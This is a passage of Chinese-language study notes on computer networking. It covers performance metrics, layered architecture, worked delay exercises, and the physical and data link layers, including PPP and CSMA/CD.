<p>​    个人区域网(PAN)：作用范围10m左右，把个人工作的地方属于个人的设备用无线技术相连，也叫无线个人区域网(WPAN)</p>
<p>按照网络的使用者分类：</p>
<p>​    公用网：电信公司出资建造的大型网络，任何人都可付费使用，也称公众网</p>
<p>​    专用网：为满足特殊业务需要建立的网络，不向外人提供服务</p>
<p>用来把用户进入到互联网的网络：</p>
<p>​    接入网：又称本地接入网或居民接入网</p>
<h2 id="计算机网络性能"><a href="#计算机网络性能" class="headerlink" title="计算机网络性能"></a>计算机网络性能</h2><h3 id="计算机网络的性能指标"><a href="#计算机网络的性能指标" class="headerlink" title="计算机网络的性能指标"></a>计算机网络的性能指标</h3><p>​    (1)<strong>速率</strong>：</p>
<p>​        定义：数据的传送速率；常指额定速率或标称速率，并不是实际的速率</p>
<p>​        单位：bit/s(比特每秒)</p>
<p>​    (2)<strong>带宽</strong>：</p>
<p>​        定义：表示网络中某通道传送数据的能力，即单位时间内网络中某信道能通过的最高数据率</p>
<p>​        单位：bit/s(比特每秒)</p>
<p>​    (3)<strong>吞吐量</strong>：</p>
<p>​        定义：单位时间内通过某网络(或信道、接口)的实际的数据量</p>
<p>​        单位：bit/s</p>
<p>​       吞吐量受网络的带宽或网络的额定速率的限制</p>
<p>​    (4)<strong>时延</strong>：</p>
<p>​        定义：数据从网络的一段传送到另一端所需的时间；又称延迟或迟延</p>
<p>​        组成：</p>
<p>​            a. 发送时延：是主机或路由器发送数据帧所需要的时间</p>
<p>​                发生位置：在机器内部的发送器中，即网络适配器中，与信道长度无关</p>
<p>​            也就是从发送数据帧的第一个比特算起， 到该帧的最后一个比特发送完毕所需 的时间。    </p>
<p>​                计算公式：</p>
<p>​                    <img src="https://img-blog.csdnimg.cn/20190128225758729.png" alt="img"></p>
<p>​            b. 传播时延：是电磁波在信道中传播一定距离所需要的时间</p>
<p>​                    发生位置：在机器外部的传输信道媒体上，与信号的发送速率无关，只与信号传送的距离有关</p>
<p>​                    计算公式：</p>
<p>​                        <img src="https://img-blog.csdnimg.cn/20190128225758741.png" alt="img"></p>
<p>​                    电磁波在在不同介质中传播速率不同，在自由空间中为光速3<em>10^5 km/s；在铜线中为2.3</em>10^5 km/s；在光纤中为2.0*10^5 km/s</p>
<p>​            c. 处理时延：主机或路由器收到分组后处理分组所用的时间；如分析首部、提取数据、差错检验、转发路由查找等</p>
<p>​            d. 排队时延：分组经过路由器时，在路由器中经历输入和输出的排队等待时间</p>
<p>​                    发生位置：各中转路由器中；取决于网络的通信量，通信量很大时会发生队列溢出，使分组丢失，相当于时延无限大</p>
<p>​            总时延=发送时延+传播时延+处理时延+排队时延</p>
<p><img src="https://img.npfs06.top/20210304135502.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>​    (5)<strong>时延带宽积</strong>：</p>
<p>​        定义：<img src="https://img-blog.csdnimg.cn/20190128225758750.png" alt="img"></p>
<p><img src="https://img.npfs06.top/20210304135752.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>​    (6**)往返时间RTT**：</p>
<p>​        定义：双向交互一次所需的时间；包含中间各结点的处理时延、排队时延、转发数据时的发送时延</p>
<p>​    (7)<strong>利用率</strong>：</p>
<p>​        信道利用率：指某信道有百分之几的时间是被利用的</p>
<p>​        网络信道利用率：全网络的信道利用率的加权平均数</p>
<p>​        D=D0/(1-U)    其中D是网络时延、D0是空闲时网络时延、U是网络利用率</p>
<p>​        特点：信道或网络利用率过高会产生非常大的时延</p>
<p>​       信道利用率并非越高越好。当某信道的利用率增大时，该信道引起的时延也就迅速增加。</p>
<p><img src="https://img.npfs06.top/20210304140201.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<h3 id="计算机网络的非性能指标"><a href="#计算机网络的非性能指标" class="headerlink" title="计算机网络的非性能指标"></a>计算机网络的非性能指标</h3><p>​    (1)费用</p>
<p>​    (2)质量</p>
<p>​    (3)标准化</p>
<p>​    (4)可靠性</p>
<p>​    (5)可扩展性和可升级性</p>
<p>​    (6)易于管理和维护</p>
<h2 id="计算机网络的体系结构"><a href="#计算机网络的体系结构" class="headerlink" title="计算机网络的体系结构"></a>计算机网络的体系结构</h2><h3 id="计算机网络体系结构的形成"><a href="#计算机网络体系结构的形成" class="headerlink" title="计算机网络体系结构的形成"></a>计算机网络体系结构的形成</h3><p>略</p>
<h3 id="协议与划分层次"><a href="#协议与划分层次" class="headerlink" title="协议与划分层次"></a>协议与划分层次</h3><p>网络协议(协议)：为进行网络中的数据交换而建立的规则、标准或约定</p>
<p>计算机网络体系结构：计算机网络各层及其协议的集合</p>
<p>网络协议的三要素：</p>
<p>​    (1)语法：数据与控制信息的结构或格式</p>
<p>​    (2)语义：需要发出何种控制信息，完成何种动作以及做出何种响应</p>
<p>​    (3)同步：事件实现顺序的详细说明</p>
<p><img src="https://img.npfs06.top/20210304141252.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>分层的优点：</p>
<p>​    (1)各层之间是独立的：某一层不需要知道下一次如何实现，只需要知道接口提供的服务</p>
<p>​    (2)灵活性高：当一层发生变化时，只要保证接口不变，就能方便修改</p>
<p>​    (3)结构上可分割：各层都可以采用最合适的技术实现</p>
<p>​    (4)易于实现和维护：这种结构使实现和调试一个庞大复杂的系统更容易，因为整个系统以被分解成若干相对独立的子系统</p>
<p>​    (5)促进标准化：因每一层的功能及其提供的服务都已精确说明</p>
<p>分层的缺点：</p>
<p>   (1) 降低效率</p>
<p>   (2) 有些功能会在不同层次重复出现，进而产生额外开销</p>
<p>各层要完成的主要功能：</p>
<p>​    (1)差错控制：使相应层次对等方的通信更可靠</p>
<p>​    (2)流量控制：发送端的发送速率必须使接收端来得及接受</p>
<p>​    (3)分段和重装：发送端将要发送的数据块划分为更小单位，在接收端将其还原</p>
<p>​    (4)复用和分用：发送端几个高层会话复用一条低层的连接，在接收端再进行分用</p>
<p>​    (5)连接建立和释放：交换数据前先建立一条逻辑连接，数据传送结束后释放连接</p>
<h3 id="各协议的体系结构"><a href="#各协议的体系结构" class="headerlink" title="各协议的体系结构"></a>各协议的体系结构</h3><p><img src="https://img.npfs06.top/20210304143006.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>各层功能概述：</p>
<p>​    (1)应用层：</p>
<p>​        作用：通过应用进程间的交互来完成特定网络应用，应用层协议定义的是应用进程间通信和交互的规则</p>
<p>​        常见协议：DNS、HTTP、SMTP等</p>
<p>​        报文：应用层交互的数据单元</p>
<p>​    (2)运输层：</p>
<p>​        作用：负责向两台主机中进程之间的通信提供通用的数据传输服务，应用进程利用该服务传送应用层报文；通用指多种应用可以使用同一运输层服务；有复用和分用功能</p>
<p>​        分用和复用：复用是多个应用层进程可同时使用下面运输层的服务，分用是运输层把收到的信息分别交付上面应用层中的相应进程</p>
<p>​        主要协议：</p>
<p>​            传输控制协议TCP：提供面向连接的、可靠的数据传输服务，数据传输的单位是报文段</p>
<p>​            用户数据报协议UDP：提供无连接的、尽最大努力的数据传输服务，数据传输的单位是用户数据报</p>
<p>​    (3)网络层：</p>
<p>​        作用：负责为分组交换网上不同主机提供通信服务。在发送数据时，网络层把运输层产生的报文段或用户数据报封装成分组或包进行传送；选择合适路由，使运输层传下来的分组能通过网络中的路由器找到目的主机</p>
<p>​        主要协议：IP协议、多种路由选择协议</p>
<p>​    (4)数据链路层：</p>
<p>​        作用：负责两主机间链路上的传输；将网络层交下来的IP数据报组装成帧，在两个相邻结点间的链路上传送帧，帧中包含数据和必要的控制信息；在接收数据时，提取出数据部分交给网络层；通过控制信息监测差错，丢弃差错帧或纠正错误</p>
<p>​    (5)物理层：</p>
<p>​        作用：考虑用多大电压代表0或1，如何识别对方发送的比特；确定电缆插头的物理结构</p>
<p>数据在各层间传递过程：</p>
<p><img src="https://img.npfs06.top/20210319124736.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<h3 id="实体、协议、服务、服务访问点"><a href="#实体、协议、服务、服务访问点" class="headerlink" title="实体、协议、服务、服务访问点"></a>实体、协议、服务、服务访问点</h3><p>实体：表示任何可发送或接受信息的硬件或软件进程；很多情况下，实体就是一个特点的软件模块</p>
<p>协议：控制两个或多个对等实体进行通信的规则的集合</p>
<p>服务：由下层向上层通过层间接口提供的功能</p>
<p>服务访问点：在同一系统相邻两层的时间进行交互的地方</p>
<p>协议与服务：在协议的控制下，两个对等实体间的通信使得本层能够向上一层提供服务。要实现本层协议，还需要使用下面层提供的服务；</p>
<p>​                     协议是”水平的”，即协议是控制对等实体间通信的规则，服务是”垂直的”，即服务是由下层向上层通过接口提供的</p>
<h3 id="TCP-IP体系结构"><a href="#TCP-IP体系结构" class="headerlink" title="TCP/IP体系结构"></a>TCP/IP体系结构</h3><p><img src="https://img.npfs06.top/20210319124716.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p><img src="https://img.npfs06.top/20210319124705.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>​    TCP/IP协议可为各式各样的应用提供服务(everthing over IP)；TCP/IP也允许IP协议在各式各样的网络构成的互联网上运行(IP over everthing)</p>
<hr>
<h2 id="习题"><a href="#习题" class="headerlink" title="习题"></a>习题</h2><p>17.收发两端间的传输距离为1000km，信号在媒体上的传播速率为2*10^8 m/s。计算以下两种情况的发送时延和传播时延</p>
<p>​    (1)数据长度为10^7 bit，数据发送速率为100 kbit/s</p>
<p>​    (2)数据长度为10^3 bit，数据发送速率为1 Gbit/s</p>
<p>​    解：</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">(1)发送时延=数据长度/发送速率=10^7/100<span class="number">*10</span>^<span class="attribute">3</span>=100s</span><br><span class="line"></span><br><span class="line">  传播时延=距离/传播速率=1000<span class="number">*10</span>^3/2<span class="number">*10</span>^<span class="attribute">8</span>=5*10^-3 s</span><br><span class="line"></span><br><span class="line">(2)发送时延=10^3/10^<span class="attribute">9</span>=1*10^-6 s</span><br><span class="line"></span><br><span class="line">  传播时延=5 ms</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>18.假设信号在媒体上的传播速率为2.3*10^8 m/s。媒体长度L分别为：</p>
<p>​    (1)10cm</p>
<p>​    (2)100m</p>
<p>​    (3)100km</p>
<p>​    (4)5000km</p>
<p>​    计算当前数据率为1Mbit/s和10Gbit/s时在以上媒体中正在传播的比特数</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">解：即求带宽时延积</span><br><span class="line"></span><br><span class="line">  (1)传播时延=长度/传播速率=10<span class="number">*10</span>^-2 / 2.3<span class="number">*10</span>^8 = 4.35<span class="number">*10</span>^-10</span><br><span class="line"></span><br><span class="line">数据率为1Mbit/s时：带宽时延积=带宽*传播时延=1<span class="number">*10</span>^6<span class="number">*4</span>.35<span class="number">*10</span>^<span class="attribute">-10</span>=4.35*10^-4</span><br><span class="line"></span><br><span class="line">数据率为10Gbit/s时：带宽时延积=10<span class="number">*10</span>^9<span class="number">*4</span>.35<span class="number">*10</span>^<span class="attribute">-10</span>=4.35</span><br><span class="line">   (2)(3)(4)<span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span></span><br></pre></td></tr></table></figure>


<p>29.有一个点对点链路，长度为50km。若数据在此链路上传播速度为2*10^8 m/s，求链路的带宽应为多少才能使传播时延和发送100字节的分组发送时延一样大？如果发送的是512字节长的分组，结果又如何？</p>
  <figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">  解：</span><br><span class="line"></span><br><span class="line">传播时延=长度/传播速率=50<span class="number">*10</span>^3/2<span class="number">*10</span>^8 = 2.5<span class="number">*10</span>^-4 s</span><br><span class="line"></span><br><span class="line">发送时延=数据长度/发送速率=100<span class="number">*8</span>/ x = 2.5<span class="number">*10</span>^-4 ；<span class="attribute">x</span>=3.2*10^6 bis/s = 3.2 Mbit/s</span><br><span class="line"></span><br><span class="line">若发送512字节分组：</span><br><span class="line"></span><br><span class="line">发送时延=数据长度/发送速率 = 512<span class="number">*8</span>/ x = 2.5<span class="number">*10</span>^-4 </span><br><span class="line"></span><br><span class="line"><span class="attribute">x</span>=16.38*10^6 bit/s = 16.38 Mbit/s</span><br></pre></td></tr></table></figure>


<h1 id="第二章-物理层"><a href="#第二章-物理层" class="headerlink" title="第二章 物理层"></a>第二章 物理层</h1><p><img src="https://img.npfs06.top/20210315125018.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<h2 id="重要内容"><a href="#重要内容" class="headerlink" title="重要内容"></a>重要内容</h2><p>  物理层的任务<br>  几种常用的信道复用技术<br>  几种常用的宽带接入技术，主要是ADSL，FTTx</p>
<h2 id="物理层的基本概念"><a href="#物理层的基本概念" class="headerlink" title="物理层的基本概念"></a>物理层的基本概念</h2><p>物理层的作用是屏蔽掉传输媒体和通信手段（即物理设备）的差异，<br>物理层的主要任务<br>  确定与传输媒体的接口有关的一些特性，<br>​    1）机械特性：定义物理连接的特性，规定物理连接时所采用的规格、接口形状、引线数目、引脚数量和排列情况。<br>​    2）电气特性：规定传输二进制位时，线路上信号的电压范围、阻抗匹配、传输速率和距高限制等。<br>​    3）功能特性：指明某条线上出现的某- -电平表示何种意义，接口部件的信号线的用途。<br>​    4）过程特性：(过程特性)定义各条物理线路的工作规程和时序关系。</p>
<p>完成数据在计算机内部（并行传输）与通信线路上（串行传输）之间的串并传输方式的转换</p>
<h2 id="数据通信的基本知识"><a href="#数据通信的基本知识" class="headerlink" title="数据通信的基本知识"></a>数据通信的基本知识</h2><p><img src="https://img.npfs06.top/20210308140603.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p><strong>1）数据通信系统的模型</strong></p>
<p> 源系统（源点，发送器）——通信系统（传输线或者网络）——目的系统（接收器，终点）<br>常用术语：  </p>
<p>​     消息：传送的信息<br>​     数据：消息的实体，即用特定方式表示的信息 0101比特流序列</p>
<p><img src="https://img.npfs06.top/20210308140826.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>​     信号：数据的电气或者电磁表现，是数据在传输过程中的存在形式<br>​     信号可以分为两类：模拟信号和数字信号</p>
<p>  <strong>信道</strong>：向某一个方向传送信息的媒体，包括<br>​    单向信道：一方发送，一方接收<br>​    双向交替信道：双方都可发送消息，但不能同时进行<br>​    双向同时信道：双方可同时发送信息</p>
<p><img src="https://img.npfs06.top/20210308141218.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p><img src="https://img.npfs06.top/20210308141542.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p><img src="http://img.npfs06.top/20210308142005.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p><strong>调制</strong>：将来自源信号的低频甚至直流信号进行变换，使得这种低频直流信号可以便于在信道内传输</p>
<p>  两种调制方法：<br> <strong>基带调制</strong>： 把数字信号转换为另一种形式的数字信号，即仅对信号的波形进行变换，可称之为编码调制</p>
<p><img src="https://img.npfs06.top/20210319123211.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>差分曼彻斯特编码: 同1异0</p>
<p>​    <strong>带通调制</strong>：使用载波进行调制，将基带信号的频率般到高频段，并将之转换为模拟信号 (数字数据调制为模拟信号)</p>
<p><img src="https://img.npfs06.top/20210319123226.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>调配：1高频，0低频</p>
<p><strong>传输媒体：</strong>  数据传输系统中在发送设备和接收设备之间的物理通路。</p>
<p><img src="https://img.npfs06.top/20210308143837.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p><strong>导向型传输介质</strong></p>
<p> 双绞线，</p>
<p><img src="https://img.npfs06.top/20210308144049.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>同轴电缆，</p>
<p><img src="https://img.npfs06.top/20210308144121.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>光缆，(很多条光纤组成光缆)</p>
<p><img src="https://img.npfs06.top/20210308144419.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p><strong>非引导型传输媒体：</strong></p>
<p>  即无线传输</p>
<h2 id="信道复用技术"><a href="#信道复用技术" class="headerlink" title="信道复用技术"></a>信道复用技术</h2><p>复用，即信道共享，几种常见的信道复用技术：频分复用，时分复用，统计时分复用</p>
<p>通过复用器和分用器进行信号的复用和分用</p>
<p><img src="https://img.npfs06.top/20210308144957.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p><strong>频分复用FDM</strong></p>
<p>用户在同样的时间内占用不同的频率带宽而复用同一个信道   </p>
<p><strong>时分复用TDM</strong></p>
<p>将时间划分为相同的时分复用帧TDM，在不同的时间占用相同的频带宽度，</p>
<p><strong>统计时分复用STDM</strong> </p>
<p>改进的时分复用，按需动态分配时隙，而不是固定分配时隙 （时隙数小于连接在集中器上的用户数，使得每次传送的STDM帧中的分组都是满的</p>
<p><strong>波分复用WDM</strong></p>
<p>光的频分复用，利用在光线技术通信中；</p>
<p><strong>码分复用CDM</strong></p>
<p>每个用户在相同的时间使用相同的频带进行通信，但各用户使用经过挑选的不同码型，从而使得个用户之间可以进行独立的通信</p>
<h2 id="数字传输系统"><a href="#数字传输系统" class="headerlink" title="数字传输系统"></a>数字传输系统</h2><h2 id="宽带接入技术"><a href="#宽带接入技术" class="headerlink" title="宽带接入技术"></a>宽带接入技术</h2><p>有线宽带接入——ADSL技术和FTTX技术</p>
<p>非对称数字用户线ASDL技术是用数字技术对现有的模拟电话用户线进行改造，使其能够承载宽带业务的一种技术；</p>
<p>光纤同轴混合网HFC在有线电视网的基础上开发的</p>
<p>光纤到户技术FTTH</p>
<h1 id="第三章-数据链路层"><a href="#第三章-数据链路层" class="headerlink" title="第三章 数据链路层"></a>第三章 数据链路层</h1><p><img src="https://img.npfs06.top/20210315125050.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<h2 id="重要内容-1"><a href="#重要内容-1" class="headerlink" title="重要内容"></a>重要内容</h2><p>  数据链路层点对点信道和广播信道的特点以及这两种信道使用的协议的特点</p>
<p>  数据链路层的三个基本问题 :  <strong>封装成帧，透明传输，差错检测</strong></p>
<p>  以太网MAC层的硬件地址</p>
<p>  适配器，转发器，集线器，网桥，以太网交换机的作用以及使用场合</p>
<p>数据链路层使用的信道主要有以下两种：</p>
<p>  <strong>点对点信道：</strong>使用一对一的点对点通信方式</p>
<p>  <strong>广播信道：</strong>使用一对多的广播通信方式</p>
<h2 id="使用点对点信道的数据链路层"><a href="#使用点对点信道的数据链路层" class="headerlink" title="使用点对点信道的数据链路层"></a>使用点对点信道的数据链路层</h2><p>链路：从一个节点到相邻节点的一段物理线路</p>
<p>数据链路：通信协议加上物理通道（使用网络适配器实现这些网络协议）</p>
<p>点对点信道的数据链路层的协议数据单元——<strong>帧</strong></p>
<p>网络层协议数据单元——IP数据报（数据报，分组或包）</p>
<p><strong>数据链路层的作用就是将网络层的数据包封装成帧（交给物理层）发送到链路上；或者把（从物理层中）接收到的帧中的IP数据报取出并交给网络层；</strong></p>
<p>数据链路协议的三个基本共同问题：封装成帧，透明传输，差错检测</p>
<h2 id="封装成帧"><a href="#封装成帧" class="headerlink" title="封装成帧"></a>封装成帧</h2><p>将IP数据报的前后分别添加首部和尾部构成帧，以便于接收端能够在物理层的比特流中知道帧的开始和结束，即进行<strong>帧定界</strong>；</p>
<p>此外，首部和尾部还要添加许多控制信息，链路层协议规定了所能传送的帧的数据部分长度上限，<strong>最大传送单元——MTU</strong></p>
<p><strong><img src="https://img.npfs06.top/20210319123307.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></strong></p>
<p>（当传送的数部份是可打印的ASCII码组成的文本文件时，我们可以使用不可打印符来作为帧定界符）</p>
<h2 id="透明传输"><a href="#透明传输" class="headerlink" title="透明传输"></a>透明传输</h2><p>透明传输的概念是指在数据链路层传输时，所传输的数据在数据链路层没有任何的阻挡，接收方所收到的数据和发送方发送的数据没有任何差别，也就是说，数据链路层对其传输的数据帧是完全透明的；</p>
<p><strong>字节填充</strong>：在传输的过程中，为防止数据部分出现帧定界符，使得接收方误以为收到的数据提前结束，所以采用转义字符的方法，将在数据部分出现的控制字符前插入转义字符，，在接收方的数据链路层将插入的转义字符删除；<br><img src="https://img.npfs06.top/20210319123326.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<h2 id="差错检测"><a href="#差错检测" class="headerlink" title="差错检测"></a>差错检测</h2><p>差错检测指的是在传输过程中产生的比特差错；</p>
<p><strong>误码率：</strong>一段时间内，传输错误的比特占传输总数的比率；</p>
<p>目前在数据链路层采用的差错检验方式是<strong>循环冗余检验；</strong></p>
<p><strong>在数据链路层我们保证的是无比特差错，而并无传输差错，传输差错还包含帧丢失，帧重复，帧失序等；</strong></p>
<h2 id="点对点协议PPP"><a href="#点对点协议PPP" class="headerlink" title="点对点协议PPP"></a><strong>点对点协议PPP</strong></h2><p>ppp协议是端计算机和ISP惊进行通信时所使用的数据链路层协议</p>
<p><strong>PPP协议的特点</strong></p>
<p>IETF认为PPP协议应满足的需求：<br>1）简单</p>
<p>2）封装成帧</p>
<p>3）透明性</p>
<p>4）支持多种网络协议</p>
<p>5）支持多种类型数据链路</p>
<p>6）具有差错检测功能</p>
<p>7）能够检测连接状态</p>
<p>8）定义最大传输单元</p>
<p>9）网络层地址协商</p>
<p>10）数据压缩协商</p>
<p><strong>PPP协议的组成</strong></p>
<p>1）一个将IP数据报封装到<strong>串行</strong>链路的方法</p>
<p>2，一个用来建立，配置和测试数据连路连接的<strong>链路控制协议LCP</strong></p>
<p>3）一套网络控制协议NCP（每个协议用来支持不同的网络层协议）<strong>PPP协议的帧格式</strong></p>
<p><img src="https://img.npfs06.top/20210319123351.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>各字段的意义</p>
<p>F为标志字段，表示一个帧的开始或者结束</p>
<p>A为地址字段，规定为0xFF</p>
<p>C为控制字段，规定为0x03</p>
<p>协议字段区分信息部分的内容（为0x0021时表示信息字段时IP数据报，为0xC021时，表示信息字段为PPP链路控制协议LCP的数据，为0x8021 时表示这是网络层的控制数据）</p>
<p>信息字段的长度可变，不超过1500字节</p>
<p>FCS字段表示的是帧检验序列</p>
<h2 id="字节填充"><a href="#字节填充" class="headerlink" title="字节填充"></a>字节填充</h2><p>当信息字段中出现和标志字段相同的比特组合时，则进行字节填充的办法使得数据部分能够完整的传送到接收端</p>
<p>零比特填充</p>
<h2 id="PPP协议的工作状态"><a href="#PPP协议的工作状态" class="headerlink" title="PPP协议的工作状态"></a>PPP协议的工作状态</h2><p>用户拨号接入ISP——→端机向ISP发送一系列链路控制协议LCP分组，→进行网络层配置→网络层协议NCP向端机分配IP地址</p>
<p><img src="https://img.npfs06.top/20210319123406.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<h2 id="使用广播通信的数据链路层"><a href="#使用广播通信的数据链路层" class="headerlink" title="使用广播通信的数据链路层"></a>使用广播通信的数据链路层</h2><p>局域网主要使用的就是广播信道</p>
<p><strong>局域网的数据链路层</strong></p>
<p><strong>局域网的特点：</strong>网络为一个单位所拥有，地理范围和站点数目有限</p>
<p>局域网的优点：</p>
<p>1）具有广播功能</p>
<p>2）便于系统的扩展和演变</p>
<p>3）提高了系统的可靠性，可用性。生存性</p>
<p>局域网的分类：星型网，环形网，总线网（最为著名的以太网就是总线网）</p>
<p>共享信道的两种技术方法：</p>
<p>1)静态划分信道</p>
<p>2)动态媒体解入控制（随机接入，受控接入）</p>
<p>由于商业竞争关系而未能形成统一的局域网标准，所以鉴于此将局域网的数据链路层划分为了两个子层——<strong>逻辑链路控制层LLC和媒体接入控制层MAC层</strong>，MAC层用来解决媒体输入相关的问题</p>
<h2 id="适配器的作用"><a href="#适配器的作用" class="headerlink" title="适配器的作用"></a>适配器的作用</h2><p>１）适配器用来连接计算机与局域网；同时要能够实现以太网协议；</p>
<p>２）适配器和局域网之间的通信是通过双绞线或者电缆以串行传输的方式进行的；而适配器与计算机之间的通信是并行方式进行的，之所以适配器要能够进行两种数据传送方式之间的串并行转化；</p>
<p>３）网络上的数据率与计算机总线上的数据率不同，因此适配器要安装内存储器以进行两种速率下的缓存功能</p>
<p>４）适配器要能够实现以太网协议</p>
<p>５）计算机的硬件地址就在适配器的ROM中；（计算机的软件地址IP地址，在计算机的存储器中）</p>
<p><img src="https://img.npfs06.top/20210319123419.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<h2 id="CSMA-CD协议"><a href="#CSMA-CD协议" class="headerlink" title="CSMA/CD协议"></a>CSMA/CD协议</h2><p>​    <strong>基于以太网的广播通信方式</strong>采用的具有检测功能的协议</p>
<p>要点：<br>  多点接入</p>
<p>  载波监听</p>
<p>  碰撞检测</p>
<p>多点接入——即总线网络的方式</p>
<p>载波监听——每个站在发送前和发送的时候都不断的检测信道是否有其他站点在发送信号</p>
<p>碰撞检测——边发送边监听，若在信道上有至少两个站点同时发送信息便发生碰撞，使得两边发送的信息都作废；</p>
<p>  <strong>碰撞检测的相关知识——</strong></p>
<p>电磁波在1km的电缆传送的传播时延约为5μs</p>
<p>所以一个站点<strong>最长</strong>在发送信息之后的<strong>一个往返时间（即两倍的端到端的传播时延）</strong>内才能收到碰撞信号，所以一个站点在发送信号的一段时间内，是不确定是否会遭遇碰撞的；——即<strong>以太网发送的不确定性</strong>；而这段不确定是否会发生碰撞的时间称为<strong>争用期（或碰撞窗口）；</strong></p>
